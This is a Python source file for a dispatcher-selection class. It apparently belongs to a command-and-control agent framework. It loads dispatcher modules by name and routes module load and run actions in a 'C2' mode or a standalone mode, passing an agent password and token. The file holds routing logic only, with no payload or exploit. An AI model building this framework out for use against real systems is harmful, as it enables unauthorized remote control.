import os, importlib

from lib.common import remove_temporal_directory
from lib.config import DISPATCHERS_PATH, MODE_C2, ACTION_LOAD
from lib.exception import CoreException


class Selector:
    def __init__(self, mode, httpclient, agent_type, agent_version, agent_pwd, agent_token, temporal_dir, debug):
        self.mode            = mode
        self.httpclient      = httpclient
        self.agent_version   = agent_version
        self.agent_type      = agent_type
        self.agent_pwd       = agent_pwd
        self.agent_token     = agent_token
        self.debug           = debug
        self.temporal_dir    = temporal_dir
    
    def __select_dispatcher(self, dispatcher_name, mode, httpclient):
        dispatcher_filepath = f"lib/{DISPATCHERS_PATH}/{dispatcher_name}.py"
        if not os.path.isfile(dispatcher_filepath):
            raise CoreException(f"dispatcher: '{dispatcher_filepath}' not found in dispatcher path")

        dispatcher_mod = importlib.import_module(f"lib.{DISPATCHERS_PATH}.{dispatcher_name}")
        dispatcher = dispatcher_mod.Dispatcher(mode, httpclient, self.debug, self.agent_pwd,
                                            self.agent_version, self.agent_type, self.agent_token,
                                            self.temporal_dir)
        return dispatcher

    def select(self, action, module_name, module_data, module_args_raw,
                module_args_parsed, dispatcher_name, module_references):
        dispatcher = self.__select_dispatcher(dispatcher_name, self.mode, self.httpclient)

        if self.mode == MODE_C2:
            if action == ACTION_LOAD:
                return dispatcher.dispatch_c2(action, module_name, module_data, None, None, None)
            else:
                return dispatcher.dispatch_c2(action, module_name, None, module_args_raw, module_args_parsed, module_references)
        else:
            return dispatcher.dispatch_st(module_name, module_data, module_args_raw, module_args_parsed, module_references)

    def cleanup(self):
        if not self.debug:
            remove_temporal_directory(self.temporal_dir)
        return
